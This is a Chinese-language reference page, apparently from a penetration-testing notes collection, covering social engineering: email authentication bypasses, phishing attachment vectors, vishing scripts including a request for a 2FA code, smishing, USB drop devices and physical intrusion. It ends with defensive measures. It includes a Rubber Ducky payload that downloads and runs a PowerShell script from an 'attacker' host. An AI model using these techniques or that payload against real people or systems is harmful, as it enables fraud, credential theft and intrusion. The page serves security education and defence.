# 社会工程攻击

> **难度：** ★★☆☆☆ | **前置知识：** 无
> 
> 最后更新：2026-05-14

---

## 邮件钓鱼 (Phishing)

### SPF/DKIM/DMARC 绕过

**SPF 绕过：**
- 自定义 Header：`X-Original-Sender` / `X-Forwarded-For`
- 利用受信任的邮件服务商发送
- 子域名欺骗：`legit.example.com`（SPF 未覆盖子域）
- URI 编码和 Unicode 域名

**DKIM 绕过：**
- 利用列表转发（List-Id 头部）
- 签名转发邮件（合法 DKIM 签名 + 伪造 From）
- 使用相同 DKIM selector 的域名

**DMARC 绕过：**
- 子域名攻击（`mail.legitimate.com`）
- From 头部欺骗（显示名伪造）
- 利用无 DMARC 策略的域名

### 邮件附件攻击载体

| 载体 | 技术 | 绕过检测 |
|------|------|----------|
| Office 宏 | VBA 宏执行 | 模板注入（远程模板加载） |
| HTA 文件 | mshta.exe 执行 | .docx + OLE 对象 |
| LNK 快捷方式 | PowerShell 下载 | .zip → .lnk |
| ISO 镜像 | 挂载执行 | 绕过 MOTW（Mark of the Web） |
| SVG 图片 | XSS / 命令执行 | 邮件客户端渲染 |
| PDF | JavaScript / 链接 | 伪装为登录页面 |

### 鱼叉钓鱼 (Spear Phishing)

**信息收集：**
- LinkedIn / GitHub / 社交媒体
- 企业官网、新闻稿、招聘启事
- WHOIS / DNS 记录
- GitHub 公开代码中的内部包名

**定制化诱饵：**
- 参考目标近期事件（公司发布、裁员、并购）
- 伪装为 IT 部门 / HR / 合作伙伴
- 使用目标熟悉的文件格式和术语

## 语音钓鱼 (Vishing)

**来电显示伪造：**
- VoIP 工具伪装来电号码
- 伪造企业内部号码（如 IT Help Desk）
- 伪装为银行/政府机构

**常见场景：**
- IT 支持：「您的电脑有安全问题，需要远程访问」
- 银行：「您的账户有异常交易」
- 快递：「包裹需要确认地址」
- 双因素认证绕过：「请告诉我您收到的验证码」

## 短信钓鱼 (Smishing)

- 短链接 + 紧急通知
- 冒充银行/快递/政府机构
- 二维码钓鱼（Quishing）
- 恶意 App 下载链接

## USB 投放攻击

**设备：**
- Rubber Ducky（HID 键盘注入）
- BadUSB（固件重编程）
- O.MG Cable（数据线伪装）
- USB Killer（硬件破坏）

**Rubber Ducky Payload 示例：**
```
REM 打开 PowerShell 并下载 payload
GUI r
DELAY 500
STRING powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
ENTER
```

**防御检测：**
- USB 设备白名单
- 禁用自动运行
- 端点监控 USB 连接事件（Sysmon Event ID 6/7）

## 物理安全

- 尾随进入（Tailgating）：跟随授权人员进入
- 门禁卡克隆（Proxmark3）
- 垃圾翻找（Dumpster Diving）
- 网络接口物理接入
- 隐藏摄像头/键盘记录器

## 防御措施

**组织层面：**
- 定期安全意识培训（含钓鱼演练）
- 邮件网关（沙箱附件检测）
- 多因素认证（减少凭证被盗影响）
- 物理安全策略（访客管理、设备锁）
- 事件响应流程（发现 → 报告 → 阻断）

**技术层面：**
- SPF/DKIM/DMARC 配置
- 附件沙箱分析
- URL 信誉检查
- 端点 DLP（数据防泄漏）
- 网络访问控制（NAC）

---

_→ 邮件安全详见 [`defense/web-defense.md`](../defense/web-defense.md)_
_→ 渗透测试检查清单详见 [`QUICK-REF.md`](../QUICK-REF.md)_
